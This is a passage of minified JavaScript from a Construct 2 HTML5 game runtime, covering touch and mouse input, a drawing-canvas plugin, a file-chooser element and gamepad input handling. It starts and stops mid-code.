c=2*(e.radiusX||e.webkitRadiusX||e.mozRadiusX||e.msRadiusX||0),l=2*(e.radiusY||e.webkitRadiusY||e.mozRadiusY||e.msRadiusY||0),o=e.force||e.webkitForce||e.mozForce||e.msForce||0;a.update(i,e.pageX-h.left,e.pageY-h.top,c,l,o);for(var u=e.pageX-h.left,p=e.pageY-h.top,d=0;d<s;d++)f.call(this._callbackObjs.touch[d],u,p)}}}}},e.onTouchStart=function(t){if(this.enable){t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault();var e,i=this.runtime.isDomFree?g:jQuery(this.runtime.canvas).offset();cr.performance_now();this.runtime.isInUserInputEvent=!0;for(var s,n=this._callbackObjs.touch.length,r=0,o=t.changedTouches.length;r<o;r++)if(e=t.changedTouches[r],-1===this.findTouch(e.identifier)){var a=e.pageX-i.left,h=e.pageY-i.top;for(this.trigger_index=this.touches.length,this.trigger_id=e.identifier,this.touches.push(c(a,h,e.identifier,this.trigger_index)),s=0;s<n;s++)u.call(this._callbackObjs.touch[s],a,h)}this.runtime.isInUserInputEvent=!1}},e.onTouchEnd=function(t,e){if(this.enable){var i;t.preventDefault&&cr.isCanvasInputEvent(t)&&t.preventDefault(),this.runtime.isInUserInputEvent=!0;for(var s,n=this._callbackObjs.touch.length,r=0,o=t.changedTouches.length;r<o;r++)if(i=t.changedTouches[r],0<=(i=this.findTouch(i.identifier))){for(this.trigger_index=this.touches[i].startindex,this.trigger_id=this.touches[i].id,this.lastTouchX=this.touches[i].x,this.lastTouchY=this.touches[i].y,s=0;s<n;s++)p.call(this._callbackObjs.touch[s],this.lastTouchX,this.lastTouchY);e||this.touches[i].maybeTriggerTap(this,i),a(this.touches[i]),this.touches.splice(i,1)}this.runtime.isInUserInputEvent=!1}},e.updateCursor=function(t){var e=this.runtime.isDomFree?g:jQuery(this.runtime.canvas).offset();this.cursor.x=t.pageX-e.left,this.cursor.y=t.pageY-e.top},e.onMouseDown=function(t){var e;this.enable&&(this.updateCursor(t),this.mouseDown=!0,t.preventDefault&&this.runtime.had_a_click&&!this.runtime.isMobile&&t.preventDefault(),-1!==(e=this.findTouch(0))&&(a(this.touches[e]),cr.arrayRemove(this.touches,e)),t={changedTouches:[{pageX:t.pageX,pageY:t.pageY,identifier:0}]},this.onTouchStart(t))},e.onMouseMove=function(t){this.enable&&(this.updateCursor(t),this.mouseDown&&(t={changedTouches:[{pageX:t.pageX,pageY:t.pageY,identifier:0}]},this.onTouchMove(t)))},e.onMouseUp=function(t){this.enable&&(this.updateCursor(t),this.mouseDown=!1,t.preventDefault&&this.runtime.had_a_click&&!this.runtime.isMobile&&t.preventDefault(),this.runtime.had_a_click=!0,t={changedTouches:[{pageX:t.pageX,pageY:t.pageY,identifier:0}]},this.onTouchEnd(t))},e.tick2=function(){if(this.enable){for(var t,e=cr.performance_now(),i=0,s=this.touches.length;i<s;++i)(t=this.touches[i]).time<=e-50&&(t.lasttime=e);this.lastTouchX=null,this.lastTouchY=null}},i.prototype.IsDialogOpened=function(){return this.currentDialogs.length},t.cnds=new i,t.acts=new m,m.prototype.SetInputEnabled=function(t){this.enable=1==t},t.exps=new function(){},e.TouchCount=function(t){t.set_int(this.touches.length)},e.X=function(t){var e,i,s,n,r,o,a=this.getTouchIndex;return a<0||a>=this.touches.length?e=0:(cr.is_undefined(t)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxX,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxX=1,i.angle=0,e=i.canvasToLayer(this.touches[a].x,this.touches[a].y,!0),i.scale=s,i.zoomRate=n,i.parallaxX=r,i.angle=o):e=(i=cr.is_number(t)?this.runtime.getLayerByNumber(t):this.runtime.getLayerByName(t))?i.canvasToLayer(this.touches[a].x,this.touches[a].y,!0):0,e)},e.XAt=function(t,e,i){var s,n,r,o,a;(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):cr.is_undefined(i)?(n=(s=this.runtime.getLayerByNumber(0)).scale,r=s.zoomRate,o=s.parallaxX,a=s.angle,s.scale=1,s.zoomRate=1,s.parallaxX=1,s.angle=0,t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!0)),s.scale=n,s.zoomRate=r,s.parallaxX=o,s.angle=a):(s=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!0)):t.set_float(0)},e.XForID=function(t,e,i){var s,n,r,o,a=this.findTouch(e);a<0?t.set_float(0):(s=this.touches[a],cr.is_undefined(i)?(r=(n=this.runtime.getLayerByNumber(0)).scale,o=n.zoomRate,e=n.parallaxX,a=n.angle,n.scale=1,n.zoomRate=1,n.parallaxX=1,n.angle=0,t.set_float(n.canvasToLayer(s.x,s.y,!0)),n.scale=r,n.zoomRate=o,n.parallaxX=e,n.angle=a):(n=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(n.canvasToLayer(s.x,s.y,!0)):t.set_float(0))},e.Y=function(t){var e,i,s,n,r,o,a=this.getTouchIndex;if(!(a<0||a>=this.touches.length))return cr.is_undefined(t)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxY,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxY=1,i.angle=0,e=i.canvasToLayer(this.touches[a].x,this.touches[a].y,!1),i.scale=s,i.zoomRate=n,i.parallaxY=r,i.angle=o):e=(i=cr.is_number(t)?this.runtime.getLayerByNumber(t):this.runtime.getLayerByName(t))?i.canvasToLayer(this.touches[a].x,this.touches[a].y,!1):0,e;e=0},e.YAt=function(t,e,i){var s,n,r,o,a;(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):cr.is_undefined(i)?(n=(s=this.runtime.getLayerByNumber(0)).scale,r=s.zoomRate,o=s.parallaxY,a=s.angle,s.scale=1,s.zoomRate=1,s.parallaxY=1,s.angle=0,t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!1)),s.scale=n,s.zoomRate=r,s.parallaxY=o,s.angle=a):(s=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(s.canvasToLayer(this.touches[e].x,this.touches[e].y,!1)):t.set_float(0)},e.YForID=function(t,e,i){var s,n,r,o,a=this.findTouch(e);a<0?t.set_float(0):(s=this.touches[a],cr.is_undefined(i)?(r=(n=this.runtime.getLayerByNumber(0)).scale,o=n.zoomRate,e=n.parallaxY,a=n.angle,n.scale=1,n.zoomRate=1,n.parallaxY=1,n.angle=0,t.set_float(n.canvasToLayer(s.x,s.y,!1)),n.scale=r,n.zoomRate=o,n.parallaxY=e,n.angle=a):(n=cr.is_number(i)?this.runtime.getLayerByNumber(i):this.runtime.getLayerByName(i))?t.set_float(n.canvasToLayer(s.x,s.y,!1)):t.set_float(0))},e.AbsoluteX=function(t){this.touches.length?t.set_float(this.touches[0].x):t.set_float(0)},e.AbsoluteXAt=function(t,e){(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):t.set_float(this.touches[e].x)},e.AbsoluteXForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.x))},e.AbsoluteY=function(t){this.touches.length?t.set_float(this.touches[0].y):t.set_float(0)},e.AbsoluteYAt=function(t,e){(e=Math.floor(e))<0||e>=this.touches.length?t.set_float(0):t.set_float(this.touches[e].y)},e.AbsoluteYForID=function(t,e){e=this.findTouch(e);e<0?t.set_float(0):(e=this.touches[e],t.set_float(e.y))},e.IsInTouch=function(){return 0<this.touches.length},e.CursorX=function(t){return null==this.cursor.x?null:(cr.is_undefined(t)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxX,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxX=1,i.angle=0,e=i.canvasToLayer(this.cursor.x,this.cursor.y,!0),i.scale=s,i.zoomRate=n,i.parallaxX=r,i.angle=o):e=(i=cr.is_number(t)?this.runtime.getLayerByNumber(t):this.runtime.getLayerByName(t))?i.canvasToLayer(this.cursor.x,this.cursor.y,!0):0,e);var e,i,s,n,r,o},e.CursorY=function(t){return null==this.cursor.y?null:(cr.is_undefined(t)?(s=(i=this.runtime.getLayerByNumber(0)).scale,n=i.zoomRate,r=i.parallaxX,o=i.angle,i.scale=1,i.zoomRate=1,i.parallaxX=1,i.angle=0,e=i.canvasToLayer(this.cursor.x,this.cursor.y,!1),i.scale=s,i.zoomRate=n,i.parallaxX=r,i.angle=o):e=(i=cr.is_number(t)?this.runtime.getLayerByNumber(t):this.runtime.getLayerByName(t))?i.canvasToLayer(this.cursor.x,this.cursor.y,!1):0,e);var e,i,s,n,r,o},e.CursorAbsoluteX=function(){return this.cursor.x},e.CursorAbsoluteY=function(){return this.cursor.y}}(),cr.plugins_.c2canvas=function(t){this.runtime=t},function(){var t=cr.plugins_.c2canvas.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){this.is_family||(this.texture_img=new Image,this.texture_img.src=this.texture_file,this.texture_img.cr_filesize=this.texture_filesize,this.runtime.wait_for_textures.push(this.texture_img))},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype,i=["lighter","xor","copy","destination-over","source-in","destination-in","source-out","destination-out","source-atop","destination-atop"];e.effectToCompositeOp=function(t){return t<=0||11<=t?"source-over":i[t-1]},e.updateBlend=function(t){var e=this.runtime.gl;if(e)switch(this.srcBlend=e.ONE,this.destBlend=e.ONE_MINUS_SRC_ALPHA,t){case 1:this.srcBlend=e.ONE,this.destBlend=e.ONE;break;case 2:break;case 3:this.srcBlend=e.ONE,this.destBlend=e.ZERO;break;case 4:this.srcBlend=e.ONE_MINUS_DST_ALPHA,this.destBlend=e.ONE;break;case 5:this.srcBlend=e.DST_ALPHA,this.destBlend=e.ZERO;break;case 6:this.srcBlend=e.ZERO,this.destBlend=e.SRC_ALPHA;break;case 7:this.srcBlend=e.ONE_MINUS_DST_ALPHA,this.destBlend=e.ZERO;break;case 8:this.srcBlend=e.ZERO,this.destBlend=e.ONE_MINUS_SRC_ALPHA;break;case 9:this.srcBlend=e.DST_ALPHA,this.destBlend=e.ONE_MINUS_SRC_ALPHA;break;case 10:this.srcBlend=e.ONE_MINUS_DST_ALPHA,this.destBlend=e.SRC_ALPHA}},e.onCreate=function(){this.visible=0===this.properties[0],this.compositeOp=this.effectToCompositeOp(this.properties[1]),this.updateBlend(this.properties[1]),this.canvas=document.createElement("canvas"),this.canvas.width=this.width,this.canvas.height=this.height,this.ctx=this.canvas.getContext("2d"),this.ctx.drawImage(this.type.texture_img,0,0,this.width,this.height),this.tCanvas=document.createElement("canvas"),this.tCtx=this.tCanvas.getContext("2d"),this.update_tex=!0,this.rcTex=new cr.rect(0,0,0,0)},e.onDestroy=function(){},e.saveToJSON=function(){return{canvas_w:this.canvas.width,canvas_h:this.canvas.height,image:this.ctx.getImageData(0,0,this.canvas.width,this.canvas.height).data}},e.loadFromJSON=function(t){for(var e=this.canvas.width=t.canvas_w,i=this.canvas.height=t.canvas_h,s=this.ctx.getImageData(0,0,this.canvas.width,this.canvas.height).data,n=0;n<i;++n)for(var r=0;r<e;++r)for(var o=4*(n*e+r),a=0;a<4;++a)s[o+a]=t.image[o+a]},e.draw_instances=function(t,e){for(var i in t)0==t[i].visible&&0==this.runtime.testOverlap(this,t[i])||(e.save(),e.scale(this.canvas.width/this.width,this.canvas.height/this.height),e.rotate(-this.angle),e.translate(-this.bquad.tlx,-this.bquad.tly),e.globalCompositeOperation=t[i].compositeOp,void 0!==t[i].type.pattern&&void 0!==t[i].type.texture_img&&(t[i].pattern=e.createPattern(t[i].type.texture_img,"repeat")),t[i].draw(e),e.restore())},e.draw=function(t){t.save(),t.globalAlpha=this.opacity,t.globalCompositeOperation=this.compositeOp;var e=this.x,i=this.y;this.runtime.pixel_rounding&&(e=Math.round(e),i=Math.round(i)),t.translate(e,i),t.rotate(this.angle),t.drawImage(this.canvas,0-this.hotspotX*this.width,0-this.hotspotY*this.height,this.width,this.height),t.restore()},e.drawGL=function(t){t.setBlend(this.srcBlend,this.destBlend),this.update_tex&&(this.tex&&t.deleteTexture(this.tex),this.tex=t.loadTexture(this.canvas,!1,this.runtime.linearSampling),this.update_tex=!1),t.setTexture(this.tex),t.setOpacity(this.opacity);var e,i,s=this.bquad;this.runtime.pixel_rounding?(e=Math.round(this.x)-this.x,i=Math.round(this.y)-this.y,t.quad(s.tlx+e,s.tly+i,s.trx+e,s.try_+i,s.brx+e,s.bry+i,s.blx+e,s.bly+i)):t.quad(s.tlx,s.tly,s.trx,s.try_,s.brx,s.bry,s.blx,s.bly)},t.cnds={},t.cnds,t.acts={},(e=t.acts).SetEffect=function(t){this.compositeOp=this.effectToCompositeOp(t),this.runtime.redraw=!0,this.update_tex=!0},e.DrawPoint=function(t,e,i){var s=this.ctx;s.fillStyle=i,s.fillRect(t,e,1,1),this.runtime.redraw=!0,this.update_tex=!0},e.ResizeCanvas=function(t,e){this.canvas.width=t,this.canvas.height=e,this.runtime.redraw=!0,this.update_tex=!0},e.PasteObject=function(t){var e=this.ctx;this.update_bbox();t=t.getCurrentSol(),t=(t.select_all?t.type:t).instances;this.draw_instances(t,e),this.runtime.redraw=!0,this.update_tex=!0},e.PasteLayer=function(t){if(!t||!t.visible)return!1;var e=this.ctx;this.update_bbox(),this.tCanvas.width=this.canvas.width,this.tCanvas.height=this.canvas.height;var i=this.tCtx;i.clearRect(0,0,this.tCanvas.width,this.tCanvas.height),this.draw_instances(t.instances,i),e.drawImage(this.tCanvas,0,0,this.width,this.height),this.runtime.redraw=!0,this.update_tex=!0},e.DrawBox=function(t,e,i,s,n){this.ctx.fillStyle=n,this.ctx.fillRect(t,e,i,s),this.runtime.redraw=!0,this.update_tex=!0},e.DrawLine=function(t,e,i,s,n,r){var o=this.ctx;o.strokeStyle=n,o.lineWidth=r,o.beginPath(),o.moveTo(t,e),o.lineTo(i,s),o.stroke(),this.runtime.redraw=!0,this.update_tex=!0},e.ClearCanvas=function(){this.ctx.clearRect(0,0,this.canvas.width,this.canvas.height),this.runtime.redraw=!0,this.update_tex=!0},e.FillColor=function(t){this.ctx.fillStyle=t,this.ctx.fillRect(0,0,this.canvas.width,this.canvas.height),this.runtime.redraw=!0,this.update_tex=!0},e.fillGradient=function(t,e,i){var s,n=this.ctx,r=this.canvas.width,o=this.canvas.height;switch(t){case 0:s=n.createLinearGradient(0,0,r,0);break;case 1:s=n.createLinearGradient(0,0,0,o);break;case 2:s=n.createLinearGradient(0,0,r,o);break;case 3:s=n.createLinearGradient(r,0,0,o);break;case 4:s=n.createRadialGradient(r/2,o/2,0,r/2,o/2,Math.sqrt(r*r+o*o)/2)}try{s.addColorStop(0,e)}catch(t){s.addColorStop(0,"black")}try{s.addColorStop(1,i)}catch(t){s.addColorStop(1,"black")}this.ctx.fillStyle=s,this.ctx.fillRect(0,0,r,o),this.runtime.redraw=!0,this.update_tex=!0},e.beginPath=function(){this.ctx.beginPath()},e.drawPath=function(t,e){var i=this.ctx;i.strokeStyle=t,i.lineWidth=e,i.stroke(),this.runtime.redraw=!0,this.update_tex=!0},e.setLineSettings=function(t,e){var i=this.ctx;i.lineCap=["butt","round","square"][t],i.lineJoin=["round","bevel","milet"][e]},e.fillPath=function(t){this.ctx.fillStyle=t,this.ctx.fill(),this.runtime.redraw=!0,this.update_tex=!0},e.moveTo=function(t,e){this.ctx.moveTo(t,e)},e.lineTo=function(t,e){this.ctx.lineTo(t,e)},e.arc=function(t,e,i,s,n,r){this.ctx.arc(t,e,i,cr.to_radians(s),cr.to_radians(n),1==r)},e.drawCircle=function(t,e,i,s,n){var r=this.ctx;r.strokeStyle=s,r.lineWidth=n,r.beginPath(),r.arc(t,e,i,0,cr.to_radians(360),!0),r.stroke(),this.runtime.redraw=!0,this.update_tex=!0},e.bezierCurveTo=function(t,e,i,s,n,r){this.ctx.bezierCurveTo(t,e,i,s,n,r)},e.quadraticCurveTo=function(t,e,i,s){this.ctx.quadraticCurveTo(t,e,i,s)},e.rectPath=function(t,e,i,s){this.ctx.rect(t,e,i,s)},e.FloodFill=function(t,e,i){var s=this.ctx,n=s.getImageData(0,0,this.canvas.width,this.canvas.height);flood_fill(n.data,this.canvas.width,this.canvas.height,t,e,i),s.putImageData(n,0,0),this.runtime.redraw=!0,this.update_tex=!0},e.setLineDash=function(t,e){e=[t,e];this.ctx.setLineDash(e)},t.exps={},(t=t.exps).rgbaAt=function(t,e,i){i=this.ctx.getImageData(e,i,1,1).data;t.set_string("rgba("+i[0]+","+i[1]+","+i[2]+","+i[3]/255+")")},t.redAt=function(t,e,i){i=this.ctx.getImageData(e,i,1,1).data;t.set_int(i[0])},t.greenAt=function(t,e,i){i=this.ctx.getImageData(e,i,1,1).data;t.set_int(i[1])},t.blueAt=function(t,e,i){i=this.ctx.getImageData(e,i,1,1).data;t.set_int(i[2])},t.alphaAt=function(t,e,i){i=this.ctx.getImageData(e,i,1,1).data;t.set_int(100*i[3]/255)},t.imageUrl=function(t){t.set_string(this.canvas.toDataURL())},t.AsJSON=function(t){t.set_string(JSON.stringify({c2array:!0,size:[1,1,this.canvas.width*this.canvas.height*4],data:[[this.ctx.getImageData(0,0,this.canvas.width,this.canvas.height).data]]}))}}(),cr.plugins_.filechooser=function(t){this.runtime=t},function(){var t=cr.plugins_.filechooser.prototype;t.Type=function(t){this.plugin=t,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t){this.type=t,this.runtime=t.runtime};var e=t.Instance.prototype,i=window.URL||window.webkitURL||window.mozURL||window.msURL;function s(){}function n(){}function r(){}function o(t,e){return!t||(e=Math.floor(e))<0||e>=t.length?null:t[e]}e.onCreate=function(){var t;this.runtime.isDomFree?cr.logexport("[Construct 2] File Chooser plugin not supported on this platform - the object will not be created"):(this.elem=document.createElement("input"),this.elem.type="file",this.elem.setAttribute("accept",this.properties[0]),0!==this.properties[1]&&this.elem.setAttribute("multiple",""),this.elem.id=this.properties[3],jQuery(this.elem).appendTo(this.runtime.canvasdiv||"body"),this.element_hidden=!1,0===this.properties[2]&&(jQuery(this.elem).hide(),this.visible=!1,this.element_hidden=!0),(t=this).elem.onchange=function(){t.runtime.trigger(cr.plugins_.filechooser.prototype.cnds.OnChanged,t)},this.lastLeft=0,this.lastTop=0,this.lastRight=0,this.lastBottom=0,this.lastWinWidth=0,this.lastWinHeight=0,this.updatePosition(!0),this.runtime.tickMe(this))},e.onDestroy=function(){this.runtime.isDomFree||(jQuery(this.elem).remove(),this.elem=null)},e.tick=function(){this.updatePosition()},e.updatePosition=function(t){if(!this.runtime.isDomFree){var e=this.layer.layerToCanvas(this.x,this.y,!0),i=this.layer.layerToCanvas(this.x,this.y,!1),s=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!0),n=this.layer.layerToCanvas(this.x+this.width,this.y+this.height,!1),r=this.runtime.width/this.runtime.devicePixelRatio,o=this.runtime.height/this.runtime.devicePixelRatio;if(!this.visible||!this.layer.visible||s<=0||n<=0||r<=e||o<=i)return this.element_hidden||jQuery(this.elem).hide(),void(this.element_hidden=!0);e<1&&(e=1),i<1&&(i=1),r<=s&&(s=r-1),o<=n&&(n=o-1);r=window.innerWidth,o=window.innerHeight;t||this.lastLeft!==e||this.lastTop!==i||this.lastRight!==s||this.lastBottom!==n||this.lastWinWidth!==r||this.lastWinHeight!==o?(this.lastLeft=e,this.lastTop=i,this.lastRight=s,this.lastBottom=n,this.lastWinWidth=r,this.lastWinHeight=o,this.element_hidden&&(jQuery(this.elem).show(),this.element_hidden=!1),r=Math.round(e)+jQuery(this.runtime.canvas).offset().left,o=Math.round(i)+jQuery(this.runtime.canvas).offset().top,jQuery(this.elem).css("position","absolute"),jQuery(this.elem).offset({left:r,top:o}),jQuery(this.elem).width(Math.round(s-e)),jQuery(this.elem).height(Math.round(n-i))):this.element_hidden&&(jQuery(this.elem).show(),this.element_hidden=!1)}},e.draw=function(t){},e.drawGL=function(t){},s.prototype.OnChanged=function(){return!0},t.cnds=new s,n.prototype.SetVisible=function(t){this.runtime.isDomFree||(this.visible=0!==t)},n.prototype.SetCSSStyle=function(t,e){this.runtime.isDomFree||jQuery(this.elem).css(t,e)},n.prototype.ReleaseFile=function(t){this.runtime.isDomFree||i&&i.revokeObjectURL&&i.revokeObjectURL(t)},t.acts=new n,r.prototype.FileCount=function(t){t.set_int(!this.runtime.isDomFree&&this.elem.files.length||0)},r.prototype.FileNameAt=function(t,e){e=this.runtime.isDomFree?null:o(this.elem.files,e);t.set_string(e&&e.name||"")},r.prototype.FileSizeAt=function(t,e){e=this.runtime.isDomFree?null:o(this.elem.files,e);t.set_int(e&&e.size||0)},r.prototype.FileTypeAt=function(t,e){e=this.runtime.isDomFree?null:o(this.elem.files,e);t.set_string(e&&e.type||"")},r.prototype.FileURLAt=function(t,e){e=this.runtime.isDomFree?null:o(this.elem.files,e);e?e.c2url?t.set_string(e.c2url):i&&i.createObjectURL?(e.c2url=i.createObjectURL(e),t.set_string(e.c2url)):t.set_string(""):t.set_string("")},t.exps=new r}(),cr.plugins_.gamepad=function(t){this.runtime=t},function(){var t=cr.plugins_.gamepad.prototype,e=!1;t.Type=function(t){this.plugin=t,this.runtime=t.runtime,e=!!(navigator.getGamepads||navigator.webkitGetGamepads||navigator.mozGetGamepads||navigator.gamepads||navigator.webkitGamepads||navigator.MozGamepads||window.cr_getGamepads)},t.Type.prototype.onCreate=function(){};var i=null,s=null,p=new Array(16),n=new Array(16),r=new Array(16),o="",a="";function d(t){var e;if(!n[t])for(n[t]=new Array(20),e=0;e<20;++e)n[t][e]=0;return n[t]}function g(t){var e;if(!r[t])for(r[t]=new Array(20),e=0;e<20;++e)r[t][e]=0;return r[t]}function f(t){n[t]=null,r[t]=null}var h=16,m=null,c={};function l(t,e,i,s){return e?t>=s.length?-1:cr.is_number(s[t])?s[t]+h:s[t]:t>=i.length?-1:i[t]}c.windows={},c.windows.firefox={};var u=[0,1,2,3,4,5,8,9,10,11],y=[0,1,[7,6],2,3,[14,15],[12,13]];c.windows.firefox.xbox360=function(t,e){return l(t,e,u,y)};var _=[2,0,1,3,4,6,5,7,8,9],v=[0,1,2,3,[14,15],[12,13]];function b(t,e){return e?4<=t?-1:t+h:16<=t?-1:t}function w(t){p[t.gamepad.index]=t.gamepad,i.trigger(cr.plugins_.gamepad.prototype.cnds.OnGamepadConnected,s)}function x(t){i.trigger(cr.plugins_.gamepad.prototype.cnds.OnGamepadDisconnected,s),p[t.gamepad.index]=null}c.windows.firefox.logitechdualaction=function(t,e){return l(t,e,_,v)},t.Instance=function(t){this.type=t,this.runtime=t.runtime,i=this.runtime,s=this};var S=t.Instance.prototype;function T(){}function C(){}S.onCreate=function(){this.deadzone=this.properties[0],this.lastButton=0;var t=navigator.userAgent;o="windows",/mac/i.test(t)&&(o="mac"),m=c[o],a="chrome",/firefox/i.test(t)&&(a="firefox"),m=m&&m[a],window.addEventListener("webkitgamepadconnected",w,!1),window.addEventListener("webkitgamepaddisconnected",x,!1),window.addEventListener("MozGamepadConnected",w,!1),window.addEventListener("MozGamepadDisconnected",x,!1),window.addEventListener("gamepadconnected",w,!1),window.addEventListener("gamepaddisconnected",x,!1),this.runtime.tickMe(this),this.activeControllers=[]},S.tick=function(){this.activeControllers.length=0;var t=null,e=!1;if(navigator.getGamepads?t=navigator.getGamepads():navigator.webkitGetGamepads?t=navigator.webkitGetGamepads():navigator.mozGetGamepads?t=navigator.mozGetGamepads():navigator.msGetGamepads?t=navigator.msGetGamepads():this.runtime.isWindows8Capable&&window.cr_getGamepads?(t=window.cr_getGamepads(),e=!0):t=navigator.gamepads||navigator.webkitGamepads||navigator.MozGamepads||p,t){for(var i,s,n,r,o,a=0,h=t.length;a<h;a++){var c=t[a];if(c){var l=d(a),u=g(a);for(!function(t){for(var e=d(t),i=g(t),s=0;s<20;++s)i[s]=e[s]}(a),n=e?b:function(t){if(!m)return b;var e="";return-1<(t=t.toLowerCase()).indexOf("xbox 360")?e="xbox360":-1<t.indexOf("logitech dual action")&&(e="logitechdualaction"),m[e]||b}(c.id),i=0,s=c.buttons.length;i<s;i++)0<=(r=n(i,!1,o=void 0!==c.buttons[i].value?c.buttons[i].value:c.buttons[i]))&&r<20&&(l[r]=100*o,50<=l[r]&&u[r]<50&&(this.lastButton=r));for(i=0,s=c.axes.length;i<s;i++)r=n(i,!0,o=c.axes[i]),cr.is_number(r)?0<=r&&r<20&&(l[r]=100*o):(l[r[0]]=0,o<=(l[r[1]]=0)?l[r[0]]=Math.abs(100*o):l[r[1]]=Math.abs(100*o));this.activeControllers.push(c)}else f(a)}for(;a<20;++a)f(a)}},S.saveToJSON=function(){return{lastButton:this.lastButton}},S.loadFromJSON=function(t){this.lastButton=t.lastButton},T.prototype.SupportsGamepad=function(){return e},T.prototype.OnGamepadConnected=function(){return!0},T.prototype.OnGamepadDisconnected=function(){return!0},T.prototype.IsButtonDown=function(t,e){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;t=d(t);if(!t)return!1;t=50<=t[e];return t&&(this.lastButton=e),t},T.prototype.OnButtonDown=function(t,e){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;var i=d(t),t=g(t);if(!i||!t)return!1;t=50<=i[e]&&t[e]<50;return t&&(this.lastButton=e),t},T.prototype.OnButtonUp=function(t,e){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;var i=d(t),t=g(t);if(!i||!t)return!1;t=i[e]<50&&50<=t[e];return t&&(this.lastButton=e),t},T.prototype.HasGamepads=function(){return 0<this.activeControllers.length},T.prototype.CompareAxis=function(t,e,i,s){if(t=Math.floor(t),e=Math.floor(e),t<0||t>=this.activeControllers.length)return!1;var n=d(t);if(n){var r=n[e+h],t=0,t=e%2==0?n[e+h+1]:n[e+h-1];return Math.sqrt(r*r+t*t)<=this.deadzone&&(r=0),cr.do_cmp(r,i,s)}},T.prototype.OnAnyButtonDown=function(t){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;var e,i,s=d(t),n=g(t);if(!s||!n)return!1;for(e=0,i=s.length;e<i;e++)if(50<=s[e]&&n[e]<50)return this.lastButton=e,!0;return!1},T.prototype.OnAnyButtonUp=function(t){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;var e,i,s=d(t),n=g(t);if(!s||!n)return!1;for(e=0,i=s.length;e<i;e++)if(s[e]<50&&50<=n[e])return this.lastButton=e,!0;return!1},T.prototype.IsButtonIndexDown=function(t,e){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;t=d(t);if(!t)return!1;if((e=Math.floor(e))<0||e>=t.length)return!1;t=50<=t[e];return t&&(this.lastButton=e),t},T.prototype.OnButtonIndexDown=function(t,e){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;var i=d(t),t=g(t);if(!i||!t)return!1;if((e=Math.floor(e))<0||e>=i.length)return!1;t=50<=i[e]&&t[e]<50;return t&&(this.lastButton=e),t},T.prototype.OnButtonIndexUp=function(t,e){if((t=Math.floor(t))<0||t>=this.activeControllers.length)return!1;var i=d(t),t=g(t);if(!i||!t)return!1;if((e=Math.floor(e))<0||e>=i.length)return!1;t=i[e]<50&&50<=t[e];return t&&(this.lastButton=e),t},t.cnds=new T,t.acts=new function(){},C.prototype.GamepadCount=function(t){t.set_int(this.activeControllers.length)},C.prototype.GamepadID=function(t,e){e<0||e>=this.activeControllers.length?t.set_string(""):t.set_string(this.activeControllers[e].id)},C.prototype.GamepadAxes=function(t,e){if(e<0||e>=this.activeControllers.length)t.set_string("");else{for(var i=this.activeControllers[e].axes,s="",n=0,r=i.length;n<r;n++)s+="Axis "+n+": "+Math.round(100*i[n])+"\n";t.set_string(s)}},C.prototype.GamepadButtons=function(t,e){if(e<0||e>=this.activeControllers.length)t.set_string("");else{for(var i,s=this.activeControllers[e].buttons,n="",r=0,o=s.length;r<o;r++)i=void 0!==s[r].value?s[r].value:s[r],n+="Button "+r+": "+Math.round(100*i)+"\n";t.set_string(n)}},C.prototype.RawButton=function(t,e,i){e=Math.floor(e),i=Math.floor(i),e<0||e>=this.activeControllers.length||!(e=this.activeControllers[e].buttons)||i<0||i>=e.length?t.set_float(0):void 0!==e[i].value?t.set_float(e[i].value):t.set_float(e[i])},C.prototype.RawAxis=function(t,e,i){e=Math.floor(e),i=Math.floor(i),e<0||e>=this.activeControllers.length||!(e=this.activeControllers[e].axes)||i<0||i>=e.length?t.set_float(0):t.set_float(e[i])},C.prototype.RawButtonCount=function(t,e){(e=Math.floor(e))<0||e>=this.activeControllers.length?t.set_int(0):t.set_int(this.activeControllers[e].buttons.length)},C.prototype.RawAxisCount=function(t,e){(e=Math.floor(e))<0||e>=this.activeControllers.length?t.set_int(0):t.set_int(this.activeControllers[e].axes.length)},C.prototype.Button=function(t,e,i){e=Math.floor(e),i=Math.floor(i),e<0||e>=this.activeControllers.length||!(e=d(e))||i<0||h<=i?t.set_float(0):t.set_float(e[i])},C.prototype.Axis=function(t,e,i){var s,n;e=Math.floor(e),i=Math.floor(i),e<0||e>=this.activeControllers.length||!(s=d(e))||i<0||4<=i?t.set_float(0):(n=s[i+h],e=i%2==(e=0)?s[i+h+1]:s[i+h-1],Math.sqrt(n*n+e*e)<=this.deadzone&&(n=0),t.set_float(n))},C.prototype.LastButton=function(t){t.set_int(this.lastButton)},t.exps=new C}(),cr.plugins_.hmmg_layoutTransition_v2=function(t){this.runtime=t},function(){var 